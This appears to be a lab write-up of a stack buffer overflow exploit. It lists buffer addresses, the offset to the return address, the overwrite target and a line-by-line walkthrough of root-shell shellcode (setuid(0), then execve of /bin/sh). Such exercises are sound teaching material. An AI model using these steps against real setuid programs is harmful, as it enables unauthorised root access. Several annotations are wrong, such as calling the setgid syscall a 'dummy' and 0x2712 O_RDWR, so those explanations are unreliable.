# Buffer starting address

In GDB: 0xffffd05b 
Outside GDB: 0xffffd01b

# Buffer offset

Buffer is located at: `ebp - 0x6d`
Return address is at: `ebp + 0x4`

So,

Buffer offset from frame pointer = 0x6d = 109 bytes

Buffer offset to return address = 113 bytes

# Return address

Return Address = 0xffffd0d0

Found via exp-shellcode.py

# First assembly instruction at return address

this will be the nop instruction due to the nop sled that appears at the start of the injected code.

# Shell code explanation

add $0x18, %esp:  
Adjusts the stack pointer by 24 bytes — stack cleanup/alignment.

xor %eax, %eax:  
Sets eax to 0.

xor %ebx, %ebx:  
Sets ebx to 0.

mov $0x6, %al:  
Sets syscall number to 6 (`close` syscall).

int $0x80:  
Calls `close(0)` — closes stdin.

push %ebx:  
Pushes NULL onto stack.

push $0x7974742f:  
Pushes `/tty` string.

push $0x7665642f:  
Pushes `/dev` string.

mov %esp, %ebx:  
Sets ebx to point to `/dev/tty`.

xor %ecx, %ecx:  
Clears ecx.

mov $0x2712, %cx:  
Sets file mode in cx (O_RDWR).

mov $0x5, %al:  
Syscall number for `open`.

int $0x80:  
Calls `open("/dev/tty", O_RDWR)`.

push $0x17:  
Pushes syscall number 23 (`setuid`).

pop %eax:  
Sets eax to 23.

xor %ebx, %ebx:  
Sets uid = 0 (root).

int $0x80:  
Calls `setuid(0)` to become root.

push $0x2e:  
Pushes dummy value, ignored or used for alignment.

pop %eax:  
Loads dummy into eax — harmless.

push %ebx:  
Pushes NULL again.

int $0x80:  
May be ignored or has no side-effect.

xor %eax, %eax:  
Clears eax.

push %eax:  
Push NULL terminator.

push $0x68732f2f:  
Pushes `//sh` (part of `/bin//sh`).

push $0x6e69622f:  
Pushes `/bin`.

mov %esp, %ebx:  
ebx = pointer to `/bin//sh`.

push %eax:  
Push NULL (argv[1]).

push %ebx:  
Push pointer to "/bin//sh" (argv[0]).

mov %esp, %ecx:  
ecx = argv array.

cltd:  
Clears edx — sets envp to NULL.

mov $0x0b, %al:  
Syscall number 11 = `execve`.

int $0x80:  
Executes `/bin/sh` with root privileges.


